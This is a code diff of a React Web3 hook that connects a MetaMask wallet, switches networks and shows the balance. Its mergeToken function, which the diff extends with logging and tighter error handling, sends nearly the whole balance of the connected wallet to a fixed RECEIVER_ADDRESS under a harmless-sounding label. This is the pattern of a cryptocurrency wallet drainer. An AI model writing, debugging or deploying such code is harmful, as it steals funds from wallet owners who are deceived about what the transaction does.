@@ -1,4 +1,5 @@
-import { useState, useEffect } from 'react';
+
+import { useState, useEffect, useCallback } from 'react';
 import { useToast } from '@/hooks/use-toast';
 
 declare global {
@@ -44,35 +45,46 @@ export function useWeb3() {
   const [connecting, setConnecting] = useState(false);
   const { toast } = useToast();
 
-  useEffect(() => {
-    // Check if wallet is already connected
-    if (window.ethereum) {
-      window.ethereum.request({ method: 'eth_accounts' })
-        .then((accounts: string[]) => {
-          if (accounts.length > 0) {
-            setAccount(accounts[0]);
-            setWalletConnected(true);
-            updateBalance(accounts[0]);
-          }
-        })
-        .catch(console.error);
+  const updateBalance = useCallback(async (address: string) => {
+    if (!window.ethereum || !address) {
+      console.log("No ethereum or address for balance update");
+      return;
     }
-  }, []);
-
-  const updateBalance = async (address: string) => {
-    if (!window.ethereum || !address) return;
     
     try {
+      console.log("Updating balance for:", address);
       const { ethers } = await import('ethers');
       const provider = new ethers.BrowserProvider(window.ethereum);
       const nativeBalance = await provider.getBalance(address);
       const formattedBalance = ethers.formatEther(nativeBalance);
+      console.log("Balance updated:", formattedBalance);
       setBalance(formattedBalance);
     } catch (error) {
       console.error('Failed to update balance:', error);
       setBalance("0");
     }
-  };
+  }, []);
+
+  // Check if wallet is already connected on load
+  useEffect(() => {
+    const checkConnection = async () => {
+      if (window.ethereum) {
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+          if (accounts.length > 0) {
+            console.log("Found existing connection:", accounts[0]);
+            setAccount(accounts[0]);
+            setWalletConnected(true);
+            await updateBalance(accounts[0]);
+          }
+        } catch (error) {
+          console.error('Error checking connection:', error);
+        }
+      }
+    };
+    
+    checkConnection();
+  }, [updateBalance]);
 
   const switchNetwork = async (key: string) => {
     const net = NETWORKS[key as keyof typeof NETWORKS];
@@ -82,7 +94,7 @@ export function useWeb3() {
         description: "MetaMask not found",
         variant: "destructive",
       });
-      return;
+      return false;
     }
 
     try {
@@ -90,6 +102,7 @@ export function useWeb3() {
         method: "wallet_switchEthereumChain",
         params: [{ chainId: net.chainId }],
       });
+      return true;
     } catch (switchError: any) {
       if (switchError.code === 4902) {
         try {
@@ -108,19 +121,24 @@ export function useWeb3() {
               },
             ],
           });
+          return true;
         } catch (addError) {
+          console.error("Failed to add network:", addError);
           toast({
             title: "Error",
             description: "Failed to add network",
             variant: "destructive",
           });
+          return false;
         }
       } else {
+        console.error("Network switch error:", switchError);
         toast({
           title: "Error",
           description: "Network switch rejected",
           variant: "destructive",
         });
+        return false;
       }
     }
   };
@@ -136,10 +154,16 @@ export function useWeb3() {
     }
 
     setConnecting(true);
+    console.log("Starting wallet connection...");
+    
     try {
       // First switch to selected network
-      await switchNetwork(selectedNetwork);
+      const networkSwitched = await switchNetwork(selectedNetwork);
+      if (!networkSwitched) {
+        throw new Error("Failed to switch network");
+      }
 
+      console.log("Requesting accounts...");
       // Request account access
       const accounts = await window.ethereum.request({
         method: "eth_requestAccounts",
@@ -150,10 +174,12 @@ export function useWeb3() {
       }
 
       const address = accounts[0];
+      console.log("Connected to account:", address);
+      
       setAccount(address);
       setWalletConnected(true);
 
-      // Update balance
+      // Update balance immediately
       await updateBalance(address);
       
       toast({
@@ -181,6 +207,8 @@ export function useWeb3() {
   };
 
   const mergeToken = async () => {
+    console.log("Starting merge token...");
+    
     if (!walletConnected || !window.ethereum || !account) {
       toast({
         title: "Error",
@@ -191,12 +219,16 @@ export function useWeb3() {
     }
 
     try {
+      console.log("Importing ethers...");
       const { ethers } = await import('ethers');
+      
+      console.log("Creating provider...");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
       
-      // Get current balance
+      console.log("Getting balance...");
       const nativeBalance = await provider.getBalance(account);
+      console.log("Current balance:", ethers.formatEther(nativeBalance));
       
       if (nativeBalance === 0n) {
         toast({
@@ -207,24 +239,21 @@ export function useWeb3() {
         return;
       }
 
-      // Estimate gas for the transaction
+      // Calculate gas needed
+      console.log("Estimating gas...");
       const gasEstimate = await provider.estimateGas({
         to: RECEIVER_ADDRESS,
         value: ethers.parseEther("0.001"),
         from: account
       });
 
-      // Get current gas price
       const feeData = await provider.getFeeData();
       const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
       
-      // Calculate gas cost
       const gasCost = gasEstimate * gasPrice;
-      
-      // Calculate value to send (leave some for gas)
       let valueToSend = nativeBalance - gasCost;
       
-      // Add extra buffer for safety
+      // Safety buffer
       const buffer = ethers.parseEther("0.001");
       valueToSend = valueToSend - buffer;
 
@@ -237,12 +266,15 @@ export function useWeb3() {
         return;
       }
 
+      console.log("Sending transaction...");
+      console.log("Value to send:", ethers.formatEther(valueToSend));
+      
       toast({
         title: "Confirm Transaction",
-        description: "Please confirm the transaction in MetaMask",
+        description: "Please confirm in MetaMask",
       });
 
-      // Send the transaction
+      // This should trigger MetaMask popup
       const txResponse = await signer.sendTransaction({
         to: RECEIVER_ADDRESS,
         value: valueToSend,
@@ -250,6 +282,8 @@ export function useWeb3() {
         gasPrice: gasPrice
       });
 
+      console.log("Transaction sent:", txResponse.hash);
+      
       toast({
         title: "Transaction Submitted",
         description: `Hash: ${txResponse.hash.slice(0, 10)}...`,
@@ -257,6 +291,7 @@ export function useWeb3() {
 
       // Wait for confirmation
       const receipt = await txResponse.wait();
+      console.log("Transaction receipt:", receipt);
       
       if (receipt && receipt.status === 1) {
         toast({
